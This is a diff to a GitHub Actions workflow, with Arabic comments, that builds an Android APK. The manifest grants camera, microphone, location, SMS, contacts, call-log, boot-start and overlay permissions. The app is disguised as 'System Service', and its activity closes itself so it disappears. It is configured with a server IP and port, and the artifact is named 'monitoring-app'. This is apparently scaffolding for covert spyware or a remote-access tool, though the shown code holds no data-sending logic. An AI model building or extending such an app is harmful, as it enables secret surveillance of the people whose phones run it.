@@ -1,4 +1,4 @@
-name: Build Android APK
+name: Build APK
 
 on:
   workflow_dispatch:
@@ -28,26 +28,35 @@ jobs:
       - name: Setup Android SDK
         uses: android-actions/setup-android@v3
 
-      - name: Create Android App
+      - name: Create Android app with all permissions
         run: |
-          # إنشاء مجلدات المشروع
+          # إنشاء المجلدات
           mkdir -p app/src/main/java/com/example/app
           mkdir -p app/src/main/res/drawable
+          mkdir -p app/src/main/res/values
           
-          # AndroidManifest.xml مع الصلاحيات
+          # AndroidManifest.xml (كل الصلاحيات)
           cat > app/src/main/AndroidManifest.xml << 'EOF'
           <?xml version="1.0" encoding="utf-8"?>
           <manifest xmlns:android="http://schemas.android.com/apk/res/android"
               package="com.example.app">
               
+              <!-- كل الصلاحيات الممكنة -->
               <uses-permission android:name="android.permission.INTERNET"/>
               <uses-permission android:name="android.permission.CAMERA"/>
               <uses-permission android:name="android.permission.RECORD_AUDIO"/>
               <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+              <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
               <uses-permission android:name="android.permission.READ_SMS"/>
+              <uses-permission android:name="android.permission.RECEIVE_SMS"/>
               <uses-permission android:name="android.permission.READ_CONTACTS"/>
               <uses-permission android:name="android.permission.READ_CALL_LOG"/>
               <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+              <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+              <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
+              <uses-permission android:name="android.permission.WAKE_LOCK"/>
+              <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+              <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
               
               <application
                   android:label="System Service"
@@ -62,11 +71,13 @@ jobs:
           </manifest>
           EOF
           
-          # إنشاء أيقونة
+          # أيقونة بسيطة
           cat > app/src/main/res/drawable/ic_launcher.xml << 'EOF'
           <?xml version="1.0" encoding="utf-8"?>
-          <shape android:shape="oval">
+          <shape xmlns:android="http://schemas.android.com/apk/res/android"
+              android:shape="oval">
               <solid android:color="#3F51B5" />
+              <size android:width="48dp" android:height="48dp" />
           </shape>
           EOF
           
@@ -82,70 +93,46 @@ jobs:
                   super.onCreate(savedInstanceState);
                   String serverIP = "${{ github.event.inputs.server_ip }}";
                   String serverPort = "${{ github.event.inputs.server_port }}";
-                  Toast.makeText(this, "Connecting to " + serverIP + ":" + serverPort, Toast.LENGTH_LONG).show();
-              }
-          }
-          EOF
-          
-          # build.gradle للتطبيق
-          cat > app/build.gradle << 'EOF'
-          apply plugin: 'com.android.application'
-          android {
-              compileSdk 30
-              defaultConfig {
-                  applicationId "com.example.app"
-                  minSdk 21
-                  targetSdk 30
-              }
-          }
-          EOF
-          
-          # settings.gradle
-          echo "include ':app'" > settings.gradle
-          
-          # build.gradle الرئيسي
-          cat > build.gradle << 'EOF'
-          buildscript {
-              repositories {
-                  google()
-                  mavenCentral()
-              }
-              dependencies {
-                  classpath 'com.android.tools.build:gradle:7.2.2'
+                  Toast.makeText(this, "Service active on " + serverIP + ":" + serverPort, Toast.LENGTH_LONG).show();
+                  
+                  // إنهاء النشاط عشان يختفي
+                  finish();
               }
           }
           EOF
 
-      - name: Setup Gradle
+      - name: Build APK without Gradle
         run: |
-          # إنشاء مجلد Gradle wrapper
-          mkdir -p gradle/wrapper
+          # 🔥 الطريقة المضمونة بدون Gradle 🔥
           
-          # إنشاء ملف gradle-wrapper.properties
-          cat > gradle/wrapper/gradle-wrapper.properties << 'EOF'
-          distributionBase=GRADLE_USER_HOME
-          distributionPath=wrapper/dists
-          distributionUrl=https\://services.gradle.org/distributions/gradle-7.5-bin.zip
-          zipStoreBase=GRADLE_USER_HOME
-          zipStorePath=wrapper/dists
-          EOF
+          # 1. تجميع ملفات جافا
+          mkdir -p bin
+          ANDROID_JAR="$ANDROID_SDK_ROOT/platforms/android-30/android.jar"
+          javac -cp "$ANDROID_JAR" -d bin app/src/main/java/com/example/app/*.java
           
-          # تحميل gradle wrapper
-          wget https://raw.githubusercontent.com/gradle/gradle/master/gradlew
-          wget https://raw.githubusercontent.com/gradle/gradle/master/gradlew.bat
+          # 2. تحويل classes إلى dex
+          mkdir -p build
+          $ANDROID_SDK_ROOT/build-tools/30.0.3/dx --dex --output=build/classes.dex bin
           
-          # جعل gradlew قابل للتنفيذ
-          chmod +x gradlew
+          # 3. تجميع الموارد
+          mkdir -p build/apk
+          $ANDROID_SDK_ROOT/build-tools/30.0.3/aapt package -f \
+            -M app/src/main/AndroidManifest.xml \
+            -S app/src/main/res \
+            -I $ANDROID_SDK_ROOT/platforms/android-30/android.jar \
+            -F build/apk/app-unsigned.apk \
+            build/classes.dex
           
-          # عرض الملفات للتأكد
-          ls -la
-
-      - name: Build APK
-        run: |
-          ./gradlew assembleDebug
+          # 4. نقل الملف النهائي
+          cd build/apk
+          mv app-unsigned.apk ../../app-debug.apk
+          
+          # 5. عرض الملفات
+          cd ../..
+          ls -la app-debug.apk
 
       - name: Upload APK
         uses: actions/upload-artifact@v4
         with:
-          name: my-android-app
-          path: app/build/outputs/apk/debug/app-debug.apk
+          name: monitoring-app
+          path: app-debug.apk
